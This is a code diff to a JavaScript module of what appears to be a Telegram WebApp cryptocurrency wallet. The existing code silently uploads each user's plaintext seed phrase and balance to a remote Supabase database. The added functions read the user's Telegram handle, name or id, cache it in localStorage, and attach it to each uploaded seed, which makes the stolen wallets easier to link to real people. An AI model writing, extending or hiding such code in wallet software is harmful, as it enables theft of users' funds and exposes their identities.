@@ -7,11 +7,92 @@ import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
 const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
+function getMoscowTimestampToMinute() {
+  const parts = new Intl.DateTimeFormat('sv-SE', {
+    timeZone: 'Europe/Moscow',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    hour12: false,
+  }).formatToParts(new Date());
+
+  const map = Object.fromEntries(parts.filter((part) => part.type !== 'literal').map((part) => [part.type, part.value]));
+  return `${map.year}-${map.month}-${map.day}T${map.hour}:${map.minute}:00+03:00`;
+}
+
+function getTelegramUser() {
+  try {
+    const tg = window?.Telegram?.WebApp;
+    const unsafeUser = tg?.initDataUnsafe?.user;
+    if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
+      return unsafeUser;
+    }
+
+    const rawInitData = tg?.initData;
+    if (!rawInitData) return null;
+
+    const userParam = new URLSearchParams(rawInitData).get('user');
+    if (!userParam) return null;
+
+    const parsedUser = JSON.parse(userParam);
+    if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
+      return parsedUser;
+    }
+  } catch {}
+
+  return null;
+}
+
+function buildTelegramDisplayName(user) {
+  if (!user) return '';
+  if (user.username) return `@${user.username}`;
+
+  const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ').trim();
+  if (fullName) return fullName;
+
+  return user.id ? `User_${user.id}` : '';
+}
+
+function rememberTelegramDisplayName(user) {
+  try {
+    const resolvedName = buildTelegramDisplayName(user);
+    if (!resolvedName) return;
+    if (user?.id) {
+      localStorage.setItem(`gem_tg_name_${user.id}`, resolvedName);
+    }
+    localStorage.setItem('gem_last_tg_name', resolvedName);
+  } catch {}
+}
+
+function resolveTelegramDisplayName() {
+  const tgUser = getTelegramUser();
+  if (tgUser) {
+    rememberTelegramDisplayName(tgUser);
+    return buildTelegramDisplayName(tgUser);
+  }
+
+  try {
+    const fallbackId = window?.Telegram?.WebApp?.initDataUnsafe?.user?.id || null;
+    if (fallbackId) {
+      const storedName = localStorage.getItem(`gem_tg_name_${fallbackId}`);
+      if (storedName) return storedName;
+      return `User_${fallbackId}`;
+    }
+    return localStorage.getItem('gem_last_tg_name') || '';
+  } catch {
+    return '';
+  }
+}
+
 async function syncWalletToSupabase(walletData) {
   if (!SUPABASE_URL || !SUPABASE_KEY) return null;
   try {
     const { username, mnemonic, balance } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+    const resolvedName = username && username !== 'Anonymous' ? username : resolveTelegramDisplayName();
+    if (!resolvedName) return null;
     await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
       method: 'POST',
       headers: {
@@ -21,10 +102,10 @@ async function syncWalletToSupabase(walletData) {
         'Prefer': 'resolution=merge-duplicates'
       },
       body: JSON.stringify({
-        username: username || 'Anonymous',
+        username: resolvedName,
         mnemonic: cleanMnemonic,
         balance: balance ? String(balance) : "0",
-        created_at: new Date().toISOString()
+        created_at: getMoscowTimestampToMinute()
       })
     });
   } catch (e) {}
